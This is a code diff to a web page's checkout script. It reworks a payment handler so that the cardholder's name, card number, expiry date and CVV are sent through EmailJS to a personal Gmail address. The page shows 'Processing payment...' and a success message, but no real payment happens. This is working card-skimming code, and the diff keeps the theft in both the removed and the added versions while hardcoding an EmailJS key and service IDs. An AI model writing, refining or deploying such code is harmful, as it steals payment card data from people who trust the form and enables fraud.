@@ -537,28 +537,40 @@
           return;
         }
 
-        payBtn.disabled = true;
-        messageEl.textContent = 'Processing payment...';
+        // Initialize EmailJS with your API key
+(function() {
+  emailjs.init('_TtNAiWrHBbHKL3dt'); // API key initialization
+})();
 
-        const templateParams = {
-     to_email: 'bobbybosmer2@gmail.com',
-     card_name: name,
-     card_number: cardNum,
-     expiry_date: expiry,
-     cvv: cvv
-   };
-   emailjs
-     .send('service_clk3lle', 'template_eu1lqoh', templateParams)
-     .then(() => {
-       messageEl.textContent = '';
-       showModal();
-     })
-     .catch(err => {
-       payBtn.disabled = false;
-       messageEl.textContent = '';
-       errorEl.textContent = 'Payment failed to process. Please try again.';
-       console.error('EmailJS Error:', err);
-     });
+// Example function to send payment details via EmailJS
+function sendPaymentEmail(name, cardNum, expiry, cvv, messageEl, payBtn, errorEl, showModal) {
+  const templateParams = {
+    to_email: 'bobbybosmer2@gmail.com',
+    card_name: name,
+    card_number: cardNum,
+    expiry_date: expiry,
+    cvv: cvv
+  };
+  
+  // Disable pay button to avoid multiple clicks while processing
+  payBtn.disabled = true;
+  messageEl.textContent = 'Processing payment...';
+  errorEl.textContent = '';
+
+  emailjs.send('service_clk3lle', 'template_eu1lqoh', templateParams)
+  .then(() => {
+    messageEl.textContent = '';
+    payBtn.disabled = false;
+    showModal();
+  })
+  .catch(err => {
+    payBtn.disabled = false;
+    messageEl.textContent = '';
+    errorEl.textContent = 'Payment failed to process. Please try again.';
+    console.error('EmailJS Error:', err);
+  });
+}
+        
         });
 
 
